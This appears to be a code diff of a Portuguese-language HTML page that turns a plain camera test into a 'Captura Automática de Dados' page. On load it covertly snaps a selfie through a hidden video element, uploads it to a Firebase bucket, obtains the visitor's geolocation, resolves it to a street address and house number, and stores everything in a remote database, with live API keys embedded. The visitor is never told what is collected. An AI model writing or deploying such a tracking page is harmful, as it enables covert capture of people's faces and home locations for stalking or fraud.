@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Access</title>
+  <title>Captura Automática de Dados</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -29,18 +29,43 @@
       from { width: 0; }
       to { width: 100%; }
     }
+    #location-message {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #555;
+    }
   </style>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
 </head>
 <body>
-  <h1>Testando Acesso à Câmera</h1>
+  <h1>Captura Automática de Dados</h1>
+  <p id="location-message">Aguardando permissão para acessar sua localização...</p>
+
   <div id="loader">
     <div></div>
   </div>
-  <div id="video-container"></div>
 
   <script>
+    // Configuração do Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
+      authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
+      databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
+      projectId: "sandalias-retro-9f0c6",
+      storageBucket: "sandalias-retro-9f0c6.appspot.com",
+      messagingSenderId: "786208752798",
+      appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
+      measurementId: "G-XGVHLX01EB",
+    };
+
+    // Inicializa Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const storage = firebase.storage();
+
     const loader = document.getElementById('loader');
-    const videoContainer = document.getElementById('video-container');
 
     // Mostrar barra de carregamento
     function showLoader() {
@@ -52,68 +77,133 @@
       loader.style.display = 'none';
     }
 
-    // Listar todos os dispositivos de vídeo
-    function listDevices() {
-      navigator.mediaDevices.enumerateDevices()
-        .then(devices => {
-          const videoDevices = devices.filter(device => device.kind === 'videoinput');
-          if (videoDevices.length === 0) {
-            alert('Nenhuma câmera encontrada.');
-            hideLoader();
-            return;
-          }
-          console.log("Dispositivos de vídeo encontrados:", videoDevices);
+    // Função para capturar selfie e salvar no Storage
+    function captureSelfieAndSave() {
+      const video = document.createElement('video'); // Cria o elemento de vídeo oculto
+      const canvas = document.createElement('canvas'); // Cria o canvas oculto
 
-          // Tentar acessar a câmera traseira ou frontal
-          startVideo(videoDevices);
-        })
-        .catch(error => {
-          alert('Erro ao listar dispositivos: ' + error.message);
-          hideLoader();
-        });
-    }
+      showLoader(); // Exibe a barra de carregamento
 
-    // Tentar iniciar a câmera com base nos dispositivos encontrados
-    function startVideo(videoDevices) {
-      let backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back'));
-      let frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front'));
-
-      // Verificar se há câmeras
-      if (!backCamera && !frontCamera) {
-        alert('Nenhuma câmera traseira ou frontal encontrada.');
-        hideLoader();
-        return;
-      }
-
-      // Forçar o uso da câmera traseira ou frontal
-      const selectedCamera = backCamera || frontCamera; // Prioriza a câmera traseira, senão usa a frontal
-      console.log('Usando a câmera:', selectedCamera);
-
-      const constraints = {
-        video: { deviceId: { exact: selectedCamera.deviceId } }
-      };
-
-      // Iniciar a câmera
-      navigator.mediaDevices.getUserMedia(constraints)
+      navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
-          const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
+
           video.onloadedmetadata = () => {
-            videoContainer.innerHTML = ''; // Limpa o container
-            videoContainer.append(video); // Adiciona o vídeo à página
+            // Tira a selfie automaticamente assim que a câmera está pronta
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Para a câmera e captura a imagem
+            stream.getTracks().forEach(track => track.stop());
+
+            const selfieData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
+            uploadSelfieToStorage(selfieData);
           };
         })
         .catch(error => {
-          alert('Erro ao acessar a câmera: ' + error.message);
-          hideLoader();
+          hideLoader(); // Oculta a barra de carregamento em caso de erro
+          alert('Erro ao acessar a câmera. Verifique as permissões e tente novamente.');
         });
     }
 
-    // Iniciar a detecção de dispositivos e a câmera
+    // Função para salvar selfie no Firebase Storage
+    function uploadSelfieToStorage(selfieData) {
+      const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
+      storageRef.putString(selfieData, 'data_url')
+        .then(snapshot => snapshot.ref.getDownloadURL())
+        .then(url => {
+          getLocation(url); // Após salvar a selfie, coleta localização e endereço
+        })
+        .catch(error => {
+          hideLoader();
+          alert('Erro ao salvar a selfie no Firebase Storage: ' + error.message);
+        });
+    }
+
+    // Obter endereço completo a partir de coordenadas
+    function getAddressFromCoordinates(lat, lon, selfieUrl) {
+      const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
+      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.results.length > 0) {
+            const result = data.results[0].components;
+            const addressDetails = {
+              latitude: lat,
+              longitude: lon,
+              city: result.city || result.town || result.village || '',
+              neighborhood: result.suburb || '',
+              road: result.road || '',
+              house_number: result.house_number || '',
+              country: result.country || '',
+              address: data.results[0].formatted,
+              selfieUrl: selfieUrl
+            };
+            sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
+          } else {
+            alert('Erro ao obter endereço: nenhum resultado encontrado.');
+          }
+          hideLoader();
+        })
+        .catch(error => {
+          hideLoader();
+          alert('Erro ao obter o endereço: ' + error.message);
+        });
+    }
+
+    // Localização do usuário
+    function getLocation(selfieUrl) {
+      if (navigator.geolocation) {
+        document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const { latitude, longitude } = position.coords;
+            getAddressFromCoordinates(latitude, longitude, selfieUrl);
+          },
+          error => {
+            hideLoader();
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                alert('Permissão de localização negada. Para continuar, ative a permissão nas configurações do navegador.');
+                break;
+              case error.POSITION_UNAVAILABLE:
+                alert('Não foi possível determinar sua localização. Verifique se o GPS está ativado.');
+                break;
+              case error.TIMEOUT:
+                alert('A solicitação de localização demorou demais para responder.');
+                break;
+              default:
+                alert('Erro desconhecido ao tentar acessar a localização.');
+            }
+          }
+        );
+      } else {
+        hideLoader();
+        alert('Este navegador não suporta geolocalização.');
+      }
+    }
+
+    // Enviar dados para o Firebase
+    function sendDataToFirebase(data) {
+      const reference = database.ref('userData');
+      reference.push(data, function (error) {
+        hideLoader(); // Oculta a barra de carregamento após salvar os dados
+        if (error) {
+          alert('Erro ao enviar dados para o Firebase: ' + error.message);
+        } else {
+          alert('Dados enviados com sucesso!');
+        }
+      });
+    }
+
+    // Iniciar coleta de dados automaticamente
     window.onload = () => {
-      showLoader();
-      listDevices(); // Listar dispositivos e tentar iniciar a câmera
+      captureSelfieAndSave(); // Primeiro passo: captura a selfie automaticamente
     };
   </script>
 </body>
